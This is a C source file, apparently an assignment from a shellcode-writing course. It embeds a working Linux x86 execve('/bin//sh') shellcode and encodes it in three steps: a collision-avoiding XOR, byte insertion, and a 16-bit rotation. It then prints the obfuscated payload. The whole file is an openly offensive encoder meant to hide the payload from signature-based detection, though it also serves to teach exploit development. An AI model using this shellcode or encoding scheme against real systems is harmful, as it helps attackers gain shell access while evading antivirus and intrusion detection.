//Description:	Assignment #4 (PoC of Custom_Encoding_Schema)
//Author:	Paolo Stivanin <https://github.com/polslinux>
//SLAE ID:	526

#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#define ROL 0x00
#define ROR !ROL

void concatenate(uint8_t [], uint32_t);
void rotate(uint32_t, uint32_t, uint32_t);
void split_uint32(uint32_t);

uint8_t *finalShellcode;
uint32_t counter = 0;

int main(void){
	uint8_t execveShellcode[] = {0xeb,0x25,0x5e,0x89,0xf7,0x31,0xc0,0x50,0x89,0xe2,0x50,0x83,0xc4,0x03,0x8d,0x76,0x04,0x33,0x06,0x50,0x31,0xc0,0x33,0x07,0x50,0x89,0xe3,0x31,0xc0,0x50,0x8d,0x3b,0x57,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xe8,0xd6,0xff,0xff,0xff,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68};
	uint8_t xorByte = 0x1c;
	uint8_t insertByte = 0xb2;
	
	size_t LEN=sizeof(execveShellcode);
	uint8_t xorWithInsertion[LEN*2];
	uint32_t i, j=0;
	
	restart:
	for(i=0; i<LEN; i++){
		if(execveShellcode[i] == xorByte){
			xorByte += 1;
			goto restart;
		}
	}
	for(i=0; i<LEN; i++){
		execveShellcode[i] ^= xorByte;
	}
	
	printf("XOR(Shellcode) using 0x%02x:\n", xorByte);
	for(i=0; i<LEN; i++){
		if(i==LEN-1) printf("0x%02x", execveShellcode[i]);
		else printf("0x%02x,", execveShellcode[i]);
	}
	
	for(i=0; i<LEN*2; i++){
		xorWithInsertion[i] = execveShellcode[j++];
		xorWithInsertion[++i] = insertByte++;
	}
	printf("\n\nINSERTION(XOR(Shellcode)):\n");
	for(i=0; i<LEN*2; i++){
		if(i==(LEN*2)-1) printf("0x%02x", xorWithInsertion[i]);
		else printf("0x%02x,", xorWithInsertion[i]);
	}	
	
	printf("\n\nROL16(XOR(INSERTION(Shellcode))):\n");

	finalShellcode = malloc(sizeof(xorWithInsertion));
	concatenate(xorWithInsertion, sizeof(xorWithInsertion));
	
	for(i=0; i<LEN*2; i++){
		if(i==(LEN*2)-1) printf("0x%02x", finalShellcode[i]);
		else printf("0x%02x,", finalShellcode[i]);
	}
	printf("\n");
	
	free(finalShellcode);

	return 0;
}

void concatenate(uint8_t arr[], uint32_t size){
	if(size % 4 != 0){
		printf("Size must be a multiple of 4\n");
		return;
	}
		
	uint32_t i, value = 0;
	
	for(i=0;i<size;i++){
		value = value^arr[i];
		if(i%4 == 3){
			rotate(value, 16, ROL);
			value = 0;
		}
		else value = value<<8;
	}
}

void rotate(uint32_t input, uint32_t bits, uint32_t direction){
	uint32_t output;
	
	if(direction == ROL){
		output = input << (bits % (8 * sizeof(uint32_t)));
		output |= input >> ((8 * sizeof(uint32_t)) - bits % (8 * sizeof(uint32_t)));
	}
	else
	{
		output = input >> (bits % (8 * sizeof(uint32_t)));
		output |= input << ((8 * sizeof(uint32_t)) - bits % (8 * sizeof(uint32_t)));
	}
	split_uint32(output);
}

void split_uint32(uint32_t splitMe){
	uint32_t j;
	uint8_t b[4];
	b[0] = (splitMe >> 24);
	b[1] = (splitMe >> 16) & 0xff;
	b[2] = (splitMe & 0xffff) >> 8;
	b[3] = (splitMe & 0xff);
	for(j=0; j<4; j++){
		finalShellcode[counter++] = b[j];
	}
}

